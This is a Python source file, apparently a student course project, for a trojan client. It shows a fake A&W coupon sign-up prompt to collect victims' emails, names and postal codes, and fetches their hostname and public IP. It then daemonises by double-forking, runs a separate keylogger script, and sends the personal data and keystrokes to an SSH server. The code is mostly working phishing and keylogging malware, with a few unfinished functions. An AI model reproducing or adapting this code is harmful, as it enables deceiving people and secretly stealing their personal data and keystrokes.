# test_client.py

#==============================================================================
 #   Assignment:  Major Project - Tunelling Milestone 1
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Mar 24th 2020 
 #    Submitted: Mar 22nd 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  Textual Input 
 #
 #       Output:  Friendly messages to the user
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Ask user to voluntarily give up certain information.
 #                      Quietly grab the target user's computer information such as host and IP addresses. 
 #                      Double Fork and begin keylogging data. On a random interval, contact the server and report data logged       
 
 #   Required Features Not Included: Optional features such as screenshots were not included due to time and COVID constraints.
 #
 #   Known Bugs:  N/A
 #      
 #
 #   Classification: N/A
 #
#==============================================================================
import paramiko
import sys
import os
import re
import socket #to capture the local IP
import urllib.request # to capture the public ip
import logzero
import time # to randomize the contacting 
from logzero import logger

logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)

def getInput():
    '''
    This function handles the input and validation of the program. 
    It also collects some secondary information related to an IP address.
    @returns - array - The array of voluntarily given information
    '''

    infoBank = list()
    detail = 0
    regexEmail = '^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$' # server should expect validated email

    print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
    print("At A & W, we pride ourselves on getting to know our customers.\n By giving us your email, we promise to send you only the best deals straight from our hearts to yours.")
    while(detail == 0):
        email = input("Please enter an email to begin: ")         

        while not re.match(regexEmail, email): #validate an email
            email = input("That email doesnt look right. Try Again:")    
            
        print("Thanks! We only need your email, but for local offers we need more info. Enter more information?")
        
        while (detail != "Y") and (detail != "N"):
            detail = input("Y/N: ")
        
        if detail == "Y":
            firstName = input("Enter your first name: ")
            lastName = input("Enter your last name: ")
            postalCode = input("Enter your postal code for local offers: ")
            
        else:
            firstName = "Friendly"
            lastName = "User"
            postalCode = "K7P 1A3"

        host, ip,  public = getIPaddr() # could be flagged as suspicious traffic to ident.me ? 
        userInfo = [email,firstName,lastName,postalCode, host,  ip, public]
            
        print("Thank you! You are now signed up for free rewards. \
        \nWould you like to sign up another user?")
        detail = 0
        while (detail != "Y") and (detail != "N"):
            detail = input("Y/N: ")
        if detail == "Y":
            detail = 0

        infoBank.append(userInfo)
    
    print("Please visit http://www.awcoupon.ca/en and login using the email you provided and password of 'P@ssw0rd'")
    print("From our family to yours, thank you for choosing A&W. Goodbye!")
    return infoBank
     #---------------End of GetInput-----------------#

def getIPaddr():
    '''
    This function handles the capture of the user's private IP address, hostname, and public IP
    @returns - host, ip, external_ip
    '''
    print("One Moment please while we sign you up...")
    ip = 0
    host = socket.gethostname()    
    ip = socket.gethostbyname(host)    
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

    return host, ip, external_ip    


def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

    if event.Ascii == cancel_key:
        new_hook.cancel()

def connect(keyLoc):
    '''
    This function handles connecting to the server on the behalf of the caller
    @param keyLoc - The file location of the RSA key
    @return client Tunnel - The communications tunnel
    '''
    try:
        sftp = 0
        client = 0
        host = "::1"
        port = 9500
        usr,  pwd = 'root', 'toor'
        
        key = paramiko.RSAKey(filename=keyLoc)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host,port, usr, pwd,  key)
        chan = client.get_transport().open_session()

        return chan
    except Exception as e:
        print("We ran into a problem and have to close. Please try again later.")
        print("Unhandled exception ->"+ str(e))
        if sftp != 0:
            sftp.close()
        if client != 0:
            client.close()
        sys.exit(0)

def keylog(filepath, globals=None, locals=None):
    if globals is None:
        globals = {}
    globals.update({
        "__file__": filepath,
        "__name__": "__main__",
    })
    with open(filepath, 'rb') as file:
        exec(compile(file.read(), filepath, 'exec'), globals, locals)
    return 0

def sendFile(dataFile,  keyLoc, filename):
    '''
    This function contacts the daemon and sends the process information to it
    It will connect and then close after completion
    @param dataFile - The struct/data containing the information to be sent
    @param keyLoc - The location to connect for RSA keys
    @param fileName - The indicator of what data is to be sent
    
    @returns int - Success
    '''
    chan = connect(keyLoc) #connect
    if filename == 'infobank.txt':
        print(filename)
        #send this filename
        strn = filename
        
        chan.sendall(strn.encode('utf-8'))
        
        str = "|"
        #send the infobank data
        for indexes in dataFile:
            for values in indexes:
                str += values + ","
            str += "|"
        print(str)
        chan.sendall(str.encode('utf-8'))
    
    elif filename == 'keylog.txt':
          #send this filename
        
        with open(dataFile, 'r') as file:
            data = file.read().replace('\n', '').replace('space', ' ').replace('BackSpace',  '')
        
        chan.sendall(data.encode('utf-8'))
    
    else:
        logger.error("Unknown fille handle sent to sendFile")
        
    chan.close()
    return 0
def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    
    ''''
    This function handles the running of the client from start to finish
    @oarams - standar
    '''
    cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
    keyLoc = cwd
    keyLoc +=  '/test_rsa.key'
    
    
    infoBank = getInput()
    sendFile(infoBank,  keyLoc,  'infobank.txt')
    
    #child forks to be evil
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError as e:
        logger.error("Unable to fork for fork #1")
        sys.exit(0)
    
    os.chdir('/')

    try:
        os.setsid()
    except Exception as e:
        logger.warning("Could not change the GID and/or UID - is this process privilaged?")
        logger.warning(str(e))
            
        # End Leadership by double forking
    try:
        if os.fork() > 0:
            raise os._exit(0)
    except OSError as e:
        logger.error("Unable to fork for fork #2")
        
    #I am the child connection, I am an evil fork and shouldn't HUP
   # Flush I/O  buffers  and lockdown stderr/out/in
    sys.stdout.flush() 
    sys.stderr.flush()

    
    keylog(cwd+'/keylogger.py') # keylogger.py is located in the working directory of the client/daemon

    time.sleep(20)

    #should keylog fail to create a file, make one in its place
    if not os.path.isfile(cwd+"/loggedKeys.log"):
         with open(cwd+"/loggedKeys.log", 'a') as f:
            f.write(".")
        
    # path exists
    sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
    os._exit(0)
    
# MAIN # 
if __name__ == '__main__':
    run()
